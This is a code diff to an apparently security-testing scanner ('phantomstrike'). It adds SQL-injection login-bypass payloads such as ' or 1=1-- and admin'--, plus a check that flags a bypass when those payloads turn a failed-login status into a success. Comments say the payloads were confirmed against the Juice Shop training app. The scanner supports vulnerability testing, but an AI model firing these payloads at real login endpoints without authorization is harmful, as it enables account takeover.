@@ -1,0 +1,83 @@
+diff --git a/phantomstrike/vuln/vuln_detector.py b/phantomstrike/vuln/vuln_detector.py
+index 70f73b0..dca124d 100644
+--- a/phantomstrike/vuln/vuln_detector.py
++++ b/phantomstrike/vuln/vuln_detector.py
+@@ -25,7 +25,8 @@ by scanner/port_scanner.py -- no new class introduced):
+         "verification_method": str,    # "boolean_diff" | "time_based" |
+                                         # "error_signature" |
+                                         # "reflected_unescaped" |
+-                                        # "content_pattern_match"
++                                        # "content_pattern_match" |
++                                        # "auth_bypass_status_diff"
+     }
+ """
+ 
+@@ -68,6 +69,27 @@ SQLI_BOOLEAN_PAIRS = [
+ SQLI_SLEEP_PAYLOAD = "1' OR SLEEP(5)-- -"
+ SQLI_TIME_DELAY_SECONDS = 5
+ 
++# Comment-based auth-bypass payloads -- a DIFFERENT mechanism from
++# SQLI_BOOLEAN_PAIRS above, discovered as a real gap during Juice Shop
++# testing (Phase 3 generalization pass). SQLI_BOOLEAN_PAIRS makes the
++# WHERE clause always-true (`... OR '1'='1'`) but leaves the rest of the
++# query intact -- on a login query shaped like
++# `WHERE email='<input>' AND password='<hash>'`, an always-true email
++# clause still fails because the password comparison still runs and
++# still doesn't match. These payloads instead use `--`/`#` to comment out
++# everything AFTER the injection point, deleting the password check
++# entirely rather than satisfying it. Confirmed manually against Juice
++# Shop's /rest/user/login (' or 1=1-- as email logs in as the first user
++# in the DB with any password) where every SQLI_BOOLEAN_PAIRS payload
++# failed identically to a real wrong-password attempt.
++SQLI_AUTH_BYPASS_PAYLOADS = [
++    "' or 1=1--",
++    "' or 1=1-- -",
++    "' or '1'='1'--",
++    "admin'--",
++    "' or 1=1#",
++]
++
+ SQL_ERROR_SIGNATURES = [
+     "you have an error in your sql syntax",
+     "warning: mysql",
+@@ -400,6 +422,40 @@ class VulnDetector:
+                     logger.finding("medium", f"Error-based SQLi signal on '{param_name}' -- {sig}")
+                     break  # one signature match per payload is enough
+ 
++        # 4. Auth-bypass via comment truncation (login-endpoint pattern).
++        # Different signal from boolean_diff/error_signature above: these
++        # payloads are DESIGNED to look like a normal successful response,
++        # not a different-looking one, so a body-diff or error-string
++        # check would never catch this. Instead we compare HTTP status
++        # codes -- a known-bad baseline value should get an auth-failure
++        # status (4xx on a REST API), and if the payload flips that to a
++        # 2xx, that's real evidence the injected `--`/`#` truncated the
++        # query and deleted a check (e.g. password comparison) that
++        # should have run. The baseline-status guard below prevents this
++        # from false-firing on non-auth endpoints where everything just
++        # returns 200 regardless of input.
++        baseline_resp = self._send(param_name, "definitely_wrong_baseline_value")
++        if baseline_resp is not None and baseline_resp.status_code >= 400:
++            for payload in SQLI_AUTH_BYPASS_PAYLOADS:
++                resp = self._send(param_name, payload)
++                if resp is None:
++                    continue
++                if resp.status_code < 300:
++                    evidence = (
++                        f"Baseline (known-bad value) returned HTTP {baseline_resp.status_code}, "
++                        f"payload '{payload}' returned HTTP {resp.status_code} -- comment-based "
++                        f"injection likely truncated the query and bypassed a downstream check"
++                    )
++                    findings.append(self._make_finding(
++                        "SQLi", param_name, payload, "critical", evidence,
++                        True, "auth_bypass_status_diff",
++                    ))
++                    logger.finding(
++                        "critical",
++                        f"Auth-bypass SQLi confirmed on '{param_name}' via comment truncation",
++                    )
++                    break  # one confirmed bypass is enough evidence for this param
++
+         return findings
+ 
+     def detect_xss(self, param_name: str = None) -> list:
